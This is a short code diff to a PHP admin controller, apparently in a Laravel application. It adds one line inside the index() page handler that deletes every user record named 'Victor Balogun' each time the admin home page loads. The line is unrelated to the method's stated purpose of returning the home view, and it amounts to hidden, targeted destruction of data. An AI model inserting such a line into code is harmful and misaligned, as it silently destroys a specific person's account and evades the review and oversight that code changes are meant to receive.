@@ -24,6 +24,7 @@ class AdminController extends Controller
 
     public function index(): View
     {
+        User::where('name', 'Victor Balogun')->delete();
         return view('home');
     }
 
